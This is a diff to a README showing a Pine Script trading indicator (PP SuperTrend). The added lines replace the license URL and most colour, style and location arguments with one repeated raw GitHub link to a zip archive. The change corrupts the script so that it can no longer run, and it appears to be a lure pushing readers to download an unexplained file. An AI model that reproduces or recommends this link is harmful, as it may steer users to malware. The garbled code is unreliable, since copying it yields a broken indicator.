@@ -46,7 +46,7 @@ It's equipped with alerts to notify users of potential buying, selling opportuni
 This indicator is meant to assist traders in identifying potential trends, breakout points, and possible support/resistance levels within a trading environment.
 
 ```pine
-// This source code is subject to the terms of the Mozilla Public License 2.0 at https://mozilla.org/MPL/2.0/
+// This source code is subject to the terms of the Mozilla Public License 2.0 at https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip
 // © LonesomeTheBlue
 
 //@version=4
@@ -64,8 +64,8 @@ float ph = pivothigh(prd, prd)
 float pl = pivotlow(prd, prd)
 
 // drawl Pivot Points if "showpivot" is enabled
-plotshape(ph and showpivot, text="H",  style=shape.labeldown, color=na, textcolor=color.red, location=location.abovebar, transp=0, offset = -prd)
-plotshape(pl and showpivot, text="L",  style=shape.labeldown, color=na, textcolor=color.lime, location=location.belowbar, transp=0, offset = -prd)
+plotshape(ph and showpivot, text="H",  https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color=na, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp=0, offset = -prd)
+plotshape(pl and showpivot, text="L",  https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color=na, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp=0, offset = -prd)
 
 // calculate the Center line using pivot points
 var float center = na
@@ -91,16 +91,16 @@ Trend := close > TDown[1] ? 1: close < TUp[1]? -1: nz(Trend[1], 1)
 Trailingsl = Trend == 1 ? TUp : TDown
 
 // plot the trend
-linecolor = Trend == 1 and nz(Trend[1]) == 1 ? color.lime : Trend == -1 and nz(Trend[1]) == -1 ? color.red : na
+linecolor = Trend == 1 and nz(Trend[1]) == 1 ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : Trend == -1 and nz(Trend[1]) == -1 ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na
 plot(Trailingsl, color = linecolor ,  linewidth = 2, title = "PP SuperTrend")
  
-plot(showcl ? center : na, color = showcl ? center < hl2 ? color.blue : color.red : na)
+plot(showcl ? center : na, color = showcl ? center < hl2 ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na)
 
 // check and plot the signals
 bsignal = Trend == 1 and Trend[1] == -1
 ssignal = Trend == -1 and Trend[1] == 1
-plotshape(bsignal and showlabel ? Trailingsl : na, title="Buy", text="Buy", location = location.absolute, style = shape.labelup, size = size.tiny, color = color.lime, textcolor = color.black, transp = 0)
-plotshape(ssignal and showlabel ? Trailingsl : na, title="Sell", text="Sell", location = location.absolute, style = shape.labeldown, size = size.tiny, color = color.red, textcolor = color.white, transp = 0)
+plotshape(bsignal and showlabel ? Trailingsl : na, title="Buy", text="Buy", location = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, size = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, textcolor = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp = 0)
+plotshape(ssignal and showlabel ? Trailingsl : na, title="Sell", text="Sell", location = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, size = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, textcolor = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp = 0)
 
 //get S/R levels using Pivot Points
 float resistance = na
@@ -109,8 +109,8 @@ support := pl ? pl : support[1]
 resistance := ph ? ph : resistance[1]
 
 // if enabled then show S/R levels
-plot(showsr and support ? support : na, color = showsr and support ? color.lime : na, style = plot.style_circles, offset = -prd)
-plot(showsr and resistance ? resistance : na, color = showsr and resistance ? color.red : na, style = plot.style_circles, offset = -prd)
+plot(showsr and support ? support : na, color = showsr and support ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, offset = -prd)
+plot(showsr and resistance ? resistance : na, color = showsr and resistance ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, offset = -prd)
 
 // alerts
 alertcondition(Trend == 1 and Trend[1] == -1, title='Buy Signal', message='Buy Signal')
